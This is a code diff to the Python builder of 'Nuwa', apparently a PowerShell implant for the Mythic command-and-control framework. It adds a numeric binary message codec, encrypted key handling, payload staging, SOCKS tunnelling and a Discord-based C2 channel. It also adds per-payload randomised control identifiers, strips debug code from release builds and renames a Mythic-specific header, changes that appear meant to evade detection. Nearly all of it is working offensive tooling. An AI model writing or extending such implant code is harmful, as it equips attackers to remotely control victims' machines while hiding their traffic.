+    if enabled:
+        for marker in (begin, end):
+            source = _replace_source_once(source, marker + "\n", "", label="task error marker")
+    else:
+        output = (
+            "$response[$script:NuwaF_user_output] = New-NuwaDiagnosticOutput "
+            f"-Code {AGENT_DIAGNOSTIC_CATALOG_V2['Task failed']}"
+            if codec_profile == "binary-v2" else "$response.user_output = 'Task failed'"
+        )
+        source = _replace_marked_source_region(
+            source, begin_marker=begin, end_marker=end,
+            replacement="        " + output, label="task error output",
+        )
+    return source
+
+
+def _render_staged_agent_runtime_source(codec_profile: str = "binary-v1") -> str:
+    source = _render_protected_agent_main_source(codec_profile)
+    response_id = "$response[$script:NuwaF_id]" if codec_profile == "binary-v2" else "$response.id"
+    crypto_transition = (
+        [
+            "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(),
+            "$script:NuwaCryptoState[$script:NuwaK_OuterUuid] = $callbackUuid",
+            "$script:NuwaCryptoState[$script:NuwaK_Key] = [byte[]]$previousKey",
+        ]
+        if codec_profile == "binary-v2" else [
+            "$script:NuwaCryptoState = @{",
+            "    OuterUuid = $callbackUuid",
+            "    Key = [byte[]]$script:NuwaCryptoState.Key",
+            "}",
+        ]
+    )
+    if codec_profile == "binary-v2":
+        crypto_transition.insert(0, "$previousKey = [byte[]]$script:NuwaCryptoState.Key")
     source = _replace_source_once(
         source,
-        "            $script:NuwaState.CallbackUUID = [string]$response.id\n",
+        f"            $script:NuwaState.CallbackUUID = [string]{response_id}\n",
         "\n".join(
             [
-                "            $callbackUuid = [string]$response.id",
-                "            $script:NuwaCryptoState = @{",
-                "                OuterUuid = $callbackUuid",
-                "                Key = [byte[]]$script:NuwaCryptoState.Key",
-                "            }",
+                f"            $callbackUuid = [string]{response_id}",
+                *("            " + line for line in crypto_transition),
                 "            $script:NuwaState.CallbackUUID = $callbackUuid",
                 "",
             ]
@@ -1076,11 +1637,11 @@ def _validate_raw_parameters(c2_profile_name: str, c2_parameters: dict[str, Any]
 
     headers = dict(c2_parameters.get("headers", {}))
     for name, value in headers.items():
-        if str(name).lower() != "x-mythic-body-format":
+        if str(name).lower() != "x-agent-body-format":
             continue
         if str(value).strip().lower() != "raw-v1":
             raise ValueError(
-                "X-Mythic-Body-Format conflicts with the required raw-v1 selector"
+                "X-Agent-Body-Format conflicts with the required raw-v1 selector"
             )
 
 
@@ -1122,6 +1683,45 @@ def _render_static_codec_dispatch_source(
     *,
     protected: bool = False,
 ) -> str:
+    if codec_profile == "binary-v2":
+        encode_protection = (
+            "[byte[]](Protect-NuwaBytes -Bytes $binary -Context $Context)"
+            if protected else "$binary"
+        )
+        decode_protection = (
+            "[byte[]](Unprotect-NuwaBytes -Bytes $WireBytes -Context $Context)"
+            if protected else "$WireBytes"
+        )
+        source = r'''
+function ConvertTo-NuwaWireBytes {
+    [CmdletBinding()]
+    param([Parameter(Mandatory = $true)][System.Collections.IDictionary]$Message,
+          [Parameter(Mandatory = $true)][hashtable]$Context)
+    foreach ($response in @($Message[$script:NuwaF_responses])) {
+        if ($null -eq $response) { continue }
+        if ($response.Contains($script:NuwaF_chunk_data)) {
+            $response[$script:NuwaF_chunk_data] = [byte[]]$response[$script:NuwaF_chunk_data]
+        }
+        $download = $response[$script:NuwaF_download]
+        if ($null -ne $download -and $download.Contains($script:NuwaF_chunk_data)) {
+            $download[$script:NuwaF_chunk_data] = [byte[]]$download[$script:NuwaF_chunk_data]
+        }
+    }
+    $binary = [byte[]](ConvertTo-NuwaBinaryV2Bytes -Message $Message)
+    return ,([byte[]](__ENCODE_PROTECTION__))
+}
+
+function ConvertFrom-NuwaWireBytes {
+    [CmdletBinding()]
+    param([Parameter(Mandatory = $true)][byte[]]$WireBytes,
+          [Parameter(Mandatory = $true)][hashtable]$Context)
+    $binary = __DECODE_PROTECTION__
+    $message = ConvertFrom-NuwaBinaryV2Bytes -Bytes ([byte[]]$binary)
+    return ((ConvertTo-NuwaAgentJsonValue -Value $message) | ConvertTo-Json -Compress -Depth 20)
+}
+'''
+        return (source.replace("__ENCODE_PROTECTION__", encode_protection)
+                      .replace("__DECODE_PROTECTION__", decode_protection).strip() + "\n")
     if codec_profile == "binary-v1":
         encode_protection = (
             "[byte[]](Protect-NuwaBytes -Bytes $binary -Context $Context)"
@@ -1223,6 +1823,8 @@ function ConvertFrom-NuwaWireBytes {{
 
 def _codec_source_path(codec_profile: str, powershell_runtime: str) -> pathlib.Path:
     runtime = _coerce_powershell_runtime(powershell_runtime)
+    if codec_profile == "binary-v2":
+        return BASE_CODE_ROOT / "binary_v2.ps1"
     if codec_profile == "binary-v1":
         return BASE_CODE_ROOT / (
             "binary_v1_clm.ps1" if runtime == POWERSHELL_RUNTIME_CONSTRAINED
@@ -1239,7 +1841,6 @@ def _base_config(
     c2_profile_name: str,
     c2_parameters: dict[str, Any],
     codec_profile: str,
-    debug_logging: bool,
     framing_mode: str,
 ) -> dict[str, Any]:
     config = {
@@ -1251,7 +1852,6 @@ def _base_config(
         "ProxyPort": str(c2_parameters.get("proxy_port", "")),
         "Killdate": str(c2_parameters.get("killdate", "")),
         "CodecProfile": codec_profile,
-        "DebugLogging": bool(debug_logging),
         "MessageUuidLength": 36,
     }
     if framing_mode == "legacy":
@@ -1282,6 +1882,7 @@ def _profile_config(c2_profile_name: str, c2_parameters: dict[str, Any]) -> dict
                 c2_parameters.get("provider_cdn_origin", "https://cdn.discordapp.com")
             ).rstrip("/"),
             "DiscordApiVersion": int(c2_parameters.get("discord_api_version", 10)),
+            "DiscordUserAgent": str(c2_parameters.get("user_agent", DEFAULT_DISCORD_USER_AGENT)),
             "DiscordProviderKind": str(
                 c2_parameters.get("discord_provider_kind", "discord")
             ),
@@ -1297,6 +1898,7 @@ def _transport_envelope_source_paths(
     powershell_runtime: str,
     c2_profile_name: str,
     framing_mode: str,
+    codec_profile: str = "binary-v1",
 ) -> tuple[pathlib.Path, ...]:
     if not selection.enabled:
         return ()
@@ -1304,8 +1906,12 @@ def _transport_envelope_source_paths(
     paths: list[pathlib.Path] = [
         TRANSPORT_ENVELOPE_ROOT / "discord_functions.ps1"
     ]
-    paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{selection.envelope_format}.ps1")
-    paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_mode}.ps1")
+    format_name = selection.envelope_format
+    if codec_profile == "binary-v2" and format_name == "binary-v1":
+        format_name += "_v2"
+    paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{format_name}.ps1")
+    framing_name = f"{framing_mode}_v2" if codec_profile == "binary-v2" else framing_mode
+    paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_name}.ps1")
 
     if selection.protection != "none":
         if selection.key_mode == "directional":
@@ -1384,6 +1990,14 @@ def _render_transport_envelope_state(selection: TransportEnvelopeSelection) -> s
     return "@{ \"MasterKey\" = " + _ps_byte_array(selection.key) + " }"
 
 
+def _render_numeric_transport_envelope_state(selection: TransportEnvelopeSelection, profile: ResolvedControlProfile | None = None) -> str:
+    key = "$null" if selection.key is None else _ps_byte_array(selection.key)
+    return (
+        "$script:NuwaTransportEnvelopeState = " + _ps_empty_local_slots(profile) + "\n"
+        f"$script:NuwaTransportEnvelopeState[$script:NuwaL_MasterKey] = {key}"
+    )
+
+
 def _profile_framing_source_path(
     c2_profile_name: str,
     framing_mode: str,
@@ -1397,8 +2011,10 @@ def _profile_framing_source_path(
 def _render_profile_transport_source(
     c2_profile_name: str,
     selection: TransportEnvelopeSelection,
+    codec_profile: str = "binary-v1",
 ) -> str:
-    source = _read_text(PROFILE_ROOT / c2_profile_name / "transport.ps1")
+    transport_name = "transport_v2.ps1" if c2_profile_name == "discordx" and codec_profile == "binary-v2" else "transport.ps1"
+    source = _read_text(PROFILE_ROOT / c2_profile_name / transport_name)
     fixed_regions = {
         "discordx": (
             (
@@ -1471,11 +2087,15 @@ def render_payload_source(
     debug_logging: bool,
     command_names: list[str],
     powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
+    control_profile: ResolvedControlProfile | None = None,
 ) -> str:
     c2_profile_name = str(c2_profile_name or "").strip().lower()
     codec_profile = str(codec_profile or "").strip().lower()
     if codec_profile not in POWERSHELL_CODEC_PROFILES:
         raise ValueError(f"Unsupported codec profile '{codec_profile}'")
+    v3 = control_profile is not None and control_profile.kind == "binary-v3"
+    if v3 and (codec_profile != "binary-v2" or control_profile.payload_uuid != payload_uuid):
+        raise ValueError("Nuwa v3 control identifiers require binary-v2 runtime and matching payload UUID")
     powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
     socks_selected = _validate_socks_build(
         c2_profile_name=c2_profile_name, c2_parameters=c2_parameters,
@@ -1503,27 +2123,46 @@ def render_payload_source(
         c2_profile_name=c2_profile_name,
         c2_parameters=c2_parameters,
         codec_profile=codec_profile,
-        debug_logging=debug_logging,
         framing_mode=framing_mode,
     )
     config.update(_profile_config(c2_profile_name, c2_parameters))
+    if codec_profile == "binary-v2":
+        config["C2Profile"] = _control_ids(control_profile, "profiles", PROFILE_CODES)[c2_profile_name]
     if socks_selected:
         config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
-    config["PowerShellRuntime"] = powershell_runtime
+    config["PowerShellRuntime"] = (
+        _control_ids(control_profile, "runtime_modes", RUNTIME_MODE_CODES)[powershell_runtime]
+        if codec_profile == "binary-v2" else powershell_runtime
+    )
     _apply_transport_envelope_config(config, transport_envelope)
+    if codec_profile == "binary-v2":
+        for name in UNUSED_V2_CONFIG_SETTINGS:
+            config.pop(name, None)
     if transport_envelope.enabled:
-        config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
+        if codec_profile == "binary-v2":
+            config["TransportMessageFormat"] = _control_ids(control_profile, "framing_modes", FRAMING_MODE_CODES)[framing_mode]
+        else:
+            config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
 
-    sections = [
-        "$script:NuwaConfig = " + _ps_hashtable(config),
-        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
-        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
-    ]
+    local_init = (
+        _render_numeric_local_initialization(config, control_profile) if codec_profile == "binary-v2"
+        else [
+            "$script:NuwaConfig = " + _ps_hashtable(config),
+            "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
+        ]
+    )
+    sections = [*local_init, _read_text(BASE_CODE_ROOT / "utf8.ps1")]
+    if codec_profile == "binary-v2":
+        sections.extend((
+            _render_v3_schema(control_profile) if v3 else _read_text(BASE_CODE_ROOT / "agent_message_schema_v2.ps1"),
+            _read_text(BASE_CODE_ROOT / ("agent_message_v3.ps1" if v3 else "agent_message_v2.ps1")),
+        ))
     if transport_envelope.enabled:
         sections.insert(
-            2,
-            "$script:NuwaTransportEnvelopeState = "
-            + _render_transport_envelope_state(transport_envelope),
+            len(local_init),
+            (_render_numeric_transport_envelope_state(transport_envelope, control_profile)
+             if codec_profile == "binary-v2" else
+             "$script:NuwaTransportEnvelopeState = " + _render_transport_envelope_state(transport_envelope)),
         )
     if framing_mode == "legacy":
         sections.extend(
@@ -1534,7 +2173,7 @@ def render_payload_source(
         )
     sections.extend(
         [
-            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
+            _read_text(FRAMING_ROOT / framing_mode / ("functions_v2.ps1" if codec_profile == "binary-v2" else "functions.ps1")),
             _read_text(
                 _profile_framing_source_path(
                     c2_profile_name,
@@ -1542,14 +2181,18 @@ def render_payload_source(
                     transport_envelope,
                 )
             ),
-            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
+            _read_text(BASE_CODE_ROOT / ("runtime_helpers_v2.ps1" if codec_profile == "binary-v2" else "runtime_helpers.ps1")),
             _render_static_codec_dispatch_source(codec_profile),
         ]
     )
     for decoder_profile in _decode_codec_profiles(codec_profile):
+        codec_path = _codec_source_path(decoder_profile, powershell_runtime)
         sections.append(
-            _read_text(_codec_source_path(decoder_profile, powershell_runtime))
+            _render_numeric_codec_module(codec_path, control_profile) if decoder_profile == "binary-v2"
+            else _read_text(codec_path)
         )
+    if v3:
+        sections.append(_read_text(BASE_CODE_ROOT / "binary_v3.ps1"))
     if transport_envelope.enabled:
         sections.extend(
             _read_text(path)
@@ -1558,28 +2201,46 @@ def render_payload_source(
                 powershell_runtime,
                 c2_profile_name,
                 framing_mode,
+                codec_profile,
             )
         )
-    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))
+    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope, codec_profile))
 
     if socks_selected:
-        sections.extend(_read_text(path) for path in sorted(SOCKS_ROOT.glob("*.ps1")))
+        if codec_profile == "binary-v2":
+            sections.append(_render_numeric_socks_slot_ids(control_profile))
+            sections.extend(_render_numeric_socks_module(path, control_profile) for path in _socks_source_paths(codec_profile))
+        else:
+            sections.extend(_read_text(path) for path in _socks_source_paths(codec_profile))
 
     selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
     for dependency in ("hostname", "whoami"):
         if dependency not in selected_commands:
             selected_commands.insert(0, dependency)
     for command_name in selected_commands:
-        command_path = COMMAND_ROOT / f"{command_name}.ps1"
+        versioned_path = COMMAND_ROOT / f"{command_name}_v2.ps1"
+        command_path = versioned_path if codec_profile == "binary-v2" and versioned_path.exists() else COMMAND_ROOT / f"{command_name}.ps1"
         if command_path.exists():
             sections.append(_read_text(command_path))
 
-    agent_main_source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
-    agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected)
+    agent_main_source = _read_text(BASE_CODE_ROOT / ("agent_main_v2.ps1" if codec_profile == "binary-v2" else "agent_main.ps1"))
+    agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected, codec_profile=codec_profile)
     if c2_profile_name == "discordx" and transport_envelope.enabled:
         agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
     sections.append(agent_main_source)
-    rendered_source = "\n\n".join(sections) + "\n"
+    rendered_source = _render_debug_mode(
+        "\n\n".join(sections) + "\n", enabled=debug_logging, codec_profile=codec_profile
+    )
+    if codec_profile == "binary-v2":
+        rendered_source = _replace_numeric_local_accesses(rendered_source, control_profile)
+        rendered_source = _replace_v2_private_response_records(rendered_source, control_profile)
+        rendered_source = _remove_v2_test_entropy_hook(rendered_source)
+        rendered_source = _replace_v2_fixed_diagnostics(
+            rendered_source, debug_logging=debug_logging, allow_v3=v3,
+            control_profile=control_profile if v3 else None,
+        )
+        if v3:
+            rendered_source = _adapt_v3_runtime_source(rendered_source)
     base64_selected = (
         codec_profile == "base64" or transport_envelope.presentation == "base64"
     )
@@ -1600,11 +2261,15 @@ def render_protected_payload_source(
     protection_key: bytes,
     powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
     staging_enabled: bool = False,
+    control_profile: ResolvedControlProfile | None = None,
 ) -> str:
     c2_profile_name = str(c2_profile_name or "").strip().lower()
     codec_profile = str(codec_profile or "").strip().lower()
     if codec_profile not in POWERSHELL_CODEC_PROFILES:
         raise ValueError(f"Unsupported codec profile '{codec_profile}'")
+    v3 = control_profile is not None and control_profile.kind == "binary-v3"
+    if v3 and (codec_profile != "binary-v2" or control_profile.payload_uuid != payload_uuid):
+        raise ValueError("Nuwa v3 control identifiers require binary-v2 runtime and matching payload UUID")
     transport_envelope = _resolve_transport_envelope_selection(
         c2_profile_name,
         c2_parameters,
@@ -1644,16 +2309,26 @@ def render_protected_payload_source(
         c2_profile_name=c2_profile_name,
         c2_parameters=c2_parameters,
         codec_profile=codec_profile,
-        debug_logging=debug_logging,
         framing_mode=framing_mode,
     )
     config.update(_profile_config(c2_profile_name, c2_parameters))
+    if codec_profile == "binary-v2":
+        config["C2Profile"] = _control_ids(control_profile, "profiles", PROFILE_CODES)[c2_profile_name]
     if socks_selected:
         config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
-    config["PowerShellRuntime"] = powershell_runtime
+    config["PowerShellRuntime"] = (
+        _control_ids(control_profile, "runtime_modes", RUNTIME_MODE_CODES)[powershell_runtime]
+        if codec_profile == "binary-v2" else powershell_runtime
+    )
     _apply_transport_envelope_config(config, transport_envelope)
+    if codec_profile == "binary-v2":
+        for name in UNUSED_V2_CONFIG_SETTINGS:
+            config.pop(name, None)
     if transport_envelope.enabled:
-        config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
+        if codec_profile == "binary-v2":
+            config["TransportMessageFormat"] = _control_ids(control_profile, "framing_modes", FRAMING_MODE_CODES)[framing_mode]
+        else:
+            config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
     config["ProtectionProfile"] = protection_profile
     crypto_state = "\n".join(
         [
@@ -1663,18 +2338,35 @@ def render_protected_payload_source(
             "}",
         ]
     )
+    crypto_source = (
+        "\n".join((
+        "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(control_profile),
+            f"$script:NuwaCryptoState[$script:NuwaK_OuterUuid] = {_ps_literal(payload_uuid)}",
+            f"$script:NuwaCryptoState[$script:NuwaK_Key] = {_ps_byte_array(protection_key)}",
+        ))
+        if codec_profile == "binary-v2" else "$script:NuwaCryptoState = " + crypto_state
+    )
 
-    sections = [
-        "$script:NuwaConfig = " + _ps_hashtable(config),
-        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
-        "$script:NuwaCryptoState = " + crypto_state,
-        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
-    ]
+    local_init = (
+        _render_numeric_local_initialization(config, control_profile) if codec_profile == "binary-v2"
+        else [
+            "$script:NuwaConfig = " + _ps_hashtable(config),
+            "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
+        ]
+    )
+    sections = [*local_init, crypto_source,
+                _read_text(BASE_CODE_ROOT / "utf8.ps1")]
+    if codec_profile == "binary-v2":
+        sections.extend((
+            _render_v3_schema(control_profile) if v3 else _read_text(BASE_CODE_ROOT / "agent_message_schema_v2.ps1"),
+            _read_text(BASE_CODE_ROOT / ("agent_message_v3.ps1" if v3 else "agent_message_v2.ps1")),
+        ))
     if transport_envelope.enabled:
         sections.insert(
-            3,
-            "$script:NuwaTransportEnvelopeState = "
-            + _render_transport_envelope_state(transport_envelope),
+            len(local_init) + 1,
+            (_render_numeric_transport_envelope_state(transport_envelope, control_profile)
+             if codec_profile == "binary-v2" else
+             "$script:NuwaTransportEnvelopeState = " + _render_transport_envelope_state(transport_envelope)),
         )
     if framing_mode == "legacy":
         sections.extend(
@@ -1685,7 +2377,7 @@ def render_protected_payload_source(
         )
     sections.extend(
         [
-            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
+            _read_text(FRAMING_ROOT / framing_mode / ("functions_v2.ps1" if codec_profile == "binary-v2" else "functions.ps1")),
             _read_text(
                 _profile_framing_source_path(
                     c2_profile_name,
@@ -1693,15 +2385,23 @@ def render_protected_payload_source(
                     transport_envelope,
                 )
             ),
-            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
-            *(_read_text(path) for path in protection_source_paths),
+            _read_text(BASE_CODE_ROOT / ("runtime_helpers_v2.ps1" if codec_profile == "binary-v2" else "runtime_helpers.ps1")),
+            *(
+                _render_numeric_protection_module(path) if codec_profile == "binary-v2"
+                else _read_text(path)
+                for path in protection_source_paths
+            ),
             _render_static_codec_dispatch_source(codec_profile, protected=True),
         ]
     )
     for decoder_profile in _decode_codec_profiles(codec_profile):
+        codec_path = _codec_source_path(decoder_profile, powershell_runtime)
         sections.append(
-            _read_text(_codec_source_path(decoder_profile, powershell_runtime))
+            _render_numeric_codec_module(codec_path, control_profile) if decoder_profile == "binary-v2"
+            else _read_text(codec_path)
         )
+    if v3:
+        sections.append(_read_text(BASE_CODE_ROOT / "binary_v3.ps1"))
     if transport_envelope.enabled:
         sections.extend(
             _read_text(path)
@@ -1710,28 +2410,34 @@ def render_protected_payload_source(
                 powershell_runtime,
                 c2_profile_name,
                 framing_mode,
+                codec_profile,
             )
             if path not in protection_source_paths
         )
-    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))
+    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope, codec_profile))
 
     if socks_selected:
-        sections.extend(_read_text(path) for path in sorted(SOCKS_ROOT.glob("*.ps1")))
+        if codec_profile == "binary-v2":
+            sections.append(_render_numeric_socks_slot_ids(control_profile))
+            sections.extend(_render_numeric_socks_module(path, control_profile) for path in _socks_source_paths(codec_profile))
+        else:
+            sections.extend(_read_text(path) for path in _socks_source_paths(codec_profile))
 
     selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
     for dependency in ("hostname", "whoami"):
         if dependency not in selected_commands:
             selected_commands.insert(0, dependency)
     for command_name in selected_commands:
-        command_path = COMMAND_ROOT / f"{command_name}.ps1"
+        versioned_path = COMMAND_ROOT / f"{command_name}_v2.ps1"
+        command_path = versioned_path if codec_profile == "binary-v2" and versioned_path.exists() else COMMAND_ROOT / f"{command_name}.ps1"
         if command_path.exists():
             sections.append(_read_text(command_path))
 
     staging_module = ""
     if staging_enabled:
-        staging_module = _read_text(_staging_source_path(powershell_runtime))
-        staged_runtime = _render_staged_agent_runtime_source()
-        staged_runtime = _render_socks_agent_main_source(staged_runtime, selected=socks_selected)
+        staging_module = _read_text(_staging_source_path(powershell_runtime, codec_profile))
+        staged_runtime = _render_staged_agent_runtime_source(codec_profile)
+        staged_runtime = _render_socks_agent_main_source(staged_runtime, selected=socks_selected, codec_profile=codec_profile)
         staged_main = _read_text(STAGING_ROOT / "agent_main.ps1")
         if c2_profile_name == "discordx" and transport_envelope.enabled:
             staged_runtime = _render_discord_byte_agent_main_source(staged_runtime)
@@ -1743,21 +2449,45 @@ def render_protected_payload_source(
             ]
         )
     else:
-        agent_main_source = _render_protected_agent_main_source()
-        agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected)
+        agent_main_source = _render_protected_agent_main_source(codec_profile)
+        agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected, codec_profile=codec_profile)
         if c2_profile_name == "discordx" and transport_envelope.enabled:
             agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
         sections.append(agent_main_source)
-    rendered_source = "\n\n".join(sections) + "\n"
+    rendered_source = _render_debug_mode(
+        "\n\n".join(sections) + "\n", enabled=debug_logging, codec_profile=codec_profile
+    )
+    if codec_profile == "binary-v2":
+        rendered_source = _replace_numeric_local_accesses(rendered_source, control_profile)
+        rendered_source = _replace_v2_private_response_records(rendered_source, control_profile)
+        rendered_source = _remove_v2_test_entropy_hook(rendered_source)
+        rendered_source = _replace_v2_fixed_diagnostics(
+            rendered_source, debug_logging=debug_logging, allow_v3=v3,
+            control_profile=control_profile if v3 else None,
+        )
+        if v3:
+            rendered_source = _adapt_v3_runtime_source(rendered_source)
     base64_selected = (
         codec_profile == "base64" or transport_envelope.presentation == "base64"
     )
     if framing_mode == "raw":
         rendered_bytes = rendered_source.encode("utf-8")
         if staging_enabled:
+            checked_staging_module = (
+                _replace_v2_fixed_diagnostics(
+                    _replace_v2_private_response_records(_replace_numeric_local_accesses(staging_module, control_profile), control_profile),
+                    debug_logging=debug_logging,
+                    allow_v3=v3,
+                    control_profile=control_profile if v3 else None,
+                )
+                if codec_profile == "binary-v2" else staging_module
+            )
             _validate_staged_raw_artifact(
                 rendered_bytes,
-                staging_module.encode("utf-8"),
+                (
+                    checked_staging_module if debug_logging
+                    else _strip_debug_calls(checked_staging_module)
+                ).encode("utf-8"),
                 allow_base64_tokens=base64_selected,
             )
         elif not base64_selected:
@@ -1814,12 +2544,35 @@ class Nuwa(PayloadType):
     }
     build_parameters = [
         BuildParameter(
+            name="control_id_mode",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["default", "custom", "random"],
+            default_value="default",
+            description="Keep legacy IDs, use an uploaded v3 JSON map, or derive a v3 map from this payload UUID",
+        ),
+        BuildParameter(
+            name="control_id_random_style",
+            parameter_type=BuildParameterType.String,
+            default_value="compact",
+            description="Internal mapping marker for historical random payload compatibility",
+            hide_conditions=[
+                HideCondition(name="control_id_mode", operand=HideConditionOperand.IN,
+                              choices=["default", "custom", "random"]),
+            ],
+        ),
+        BuildParameter(
+            name="control_id_file",
+            parameter_type=BuildParameterType.File,
+            required=False,
+            description="Uploaded v3 control identifier JSON file; required only for custom mode",
+        ),
+        BuildParameter(
             name="codec_profile",
             parameter_type=BuildParameterType.ChooseOne,
             choices=list(POWERSHELL_CODEC_PROFILES),
-            default_value="binary-v1",
+            default_value="binary-v2",
             description=(
-                "Nuwa inner v1 is a canonical binary map with raw file and SOCKS bytes. "
+                "Nuwa inner v2 is a canonical numeric-keyed binary map with raw file and SOCKS bytes. "
                 "The fixed outer envelope and its presentation are selected separately "
                 "on the C2 profile."
             ),
@@ -1828,7 +2581,7 @@ class Nuwa(PayloadType):
             name="debug_logging",
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
-            description="Enable debug output in the payload",
+            description="Include debug code at build time; omit it from release payloads",
         ),
         BuildParameter(
             name="require_https",
@@ -1848,6 +2601,31 @@ class Nuwa(PayloadType):
     async def build(self) -> BuildResponse:
         response = BuildResponse(status=BuildStatus.Success)
         try:
+            control_mode = str(self.get_parameter("control_id_mode") or "default").strip().lower()
+            random_style = self.get_parameter("control_id_random_style")
+            if control_mode == "random" and random_style != "compact":
+                raise ValueError("control_id_random_style is fixed to compact for new random payloads")
+            control_file_id = self.get_parameter("control_id_file")
+            control_file_bytes = None
+            if control_mode == "custom":
+                if not isinstance(control_file_id, str) or not control_file_id:
+                    raise ValueError("control_id_file is required in custom mode")
+                from mythic_container.MythicGoRPC import (
+                    MythicRPCFileGetContentMessage, SendMythicRPCFileGetContent,
+                )
+                file_response = await SendMythicRPCFileGetContent(
+                    MythicRPCFileGetContentMessage(AgentFileId=control_file_id)
+                )
+                if not file_response.Success or not isinstance(file_response.Content, bytes):
+                    raise ValueError("control_id_file could not be retrieved from Mythic")
+                control_file_bytes = file_response.Content
+            elif control_file_id:
+                raise ValueError("control_id_file is only valid in custom mode")
+            control_profile = (
+                resolve_control_profile(load_default_profile(), control_mode, self.uuid,
+                                        control_file_bytes, random_style=random_style)
+                if control_mode != "default" else None
+            )
             selected_c2 = _resolve_selected_c2_profile(self.c2info)
             options = _resolve_payload_options(
                 c2_profile_name=selected_c2.name,
@@ -1868,6 +2646,7 @@ class Nuwa(PayloadType):
                 "codec_profile": options.codec_profile,
                 "debug_logging": options.debug_logging,
                 "command_names": list(options.command_names),
+                "control_profile": control_profile,
             }
             if protection.profile == PROTECTION_NONE:
                 payload_source = render_payload_source(
